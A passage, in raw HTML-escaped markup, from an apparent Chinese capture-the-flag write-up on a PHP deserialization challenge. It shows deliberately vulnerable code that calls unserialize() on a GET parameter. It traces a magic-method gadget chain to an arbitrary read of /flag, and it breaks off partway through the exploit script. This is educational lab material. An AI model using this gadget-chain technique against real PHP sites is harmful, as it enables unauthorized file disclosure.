class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;meta charset=&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//hint is in hint.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Start&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;guest&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;syst3m(&amp;quot;cat 127.0.0.1/etc/hint&amp;quot;);&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;I think you need /etc/hint . Before this you need to see the source code&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;_sayhello&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;ok&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;hi&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;_sayhello&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__get&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$cc&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;give you flag : &amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Info&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$phonenumber&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;123123&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$promise&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;I do&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;promise=&lt;span class=&#34;string&#34;&gt;&amp;#x27;I will not !!!!&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;promise;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;file[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;]-&amp;gt;ffiillee[&lt;span class=&#34;string&#34;&gt;&amp;#x27;ffiilleennaammee&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Room&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;/flag&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$sth_to_set&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__get&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Get_hint&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$hint&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;base64_encode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$hint&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__invoke&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;Get_hint&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$hi&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt;  &lt;span class=&#34;title class_&#34;&gt;Start&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;尾部可以看到 &lt;code&gt;Room&lt;/code&gt;  类中有个 &lt;code&gt;Get_hint()&lt;/code&gt;  方法，里面有一个 &lt;code&gt;file_get_contents&lt;/code&gt; ，可以实现任意文件读取，我们就可以利用这个读取 flag 文件了，然后就是往前倒推， &lt;code&gt;Room&lt;/code&gt;  类中 &lt;code&gt;__invoke()&lt;/code&gt;  方法调用了 &lt;code&gt;Get_hint()&lt;/code&gt; ，然后 &lt;code&gt;Room&lt;/code&gt;  类的 &lt;code&gt;__get()&lt;/code&gt;  里面有个 &lt;code&gt;return $function()&lt;/code&gt;  可以调用 &lt;code&gt;__invoke()&lt;/code&gt; ，再往前看， &lt;code&gt;Info&lt;/code&gt;  类中的 &lt;code&gt;__toString()&lt;/code&gt;  中有 &lt;code&gt;Room&lt;/code&gt;  类中不存在的属性，所以可以调用 &lt;code&gt;__get()&lt;/code&gt; ，然后 &lt;code&gt;Start&lt;/code&gt;  类中有个 &lt;code&gt;_sayhello()&lt;/code&gt;  可以调用 &lt;code&gt;__toString()&lt;/code&gt; ，然后在 &lt;code&gt;Start&lt;/code&gt;  类中 &lt;code&gt;__wakeup()&lt;/code&gt;  方法中直接调用了 &lt;code&gt;_sayhello()&lt;/code&gt; ，而我们知道的是，输入字符串之后就会先进入 &lt;code&gt;__wakeup()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;头 -&amp;gt; Start::__wakeup() -&amp;gt; Start::_sayhello() -&amp;gt; Info::__toString() -&amp;gt; Room::__get() -&amp;gt; Room::invoke() -&amp;gt; Room::Get_hint() &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Start&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;guest&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;syst3m(&amp;quot;cat 127.0.0.1/etc/hint&amp;quot;);&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Info&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$phonenumber&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;123123&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$promise&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;I do&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;promise=&lt;span class=&#34;string&#34;&gt;&amp;#x27;I will not !!!!&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;promise;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Room&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;/flag&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$sth_to_set&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Start&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Info&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Room&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span 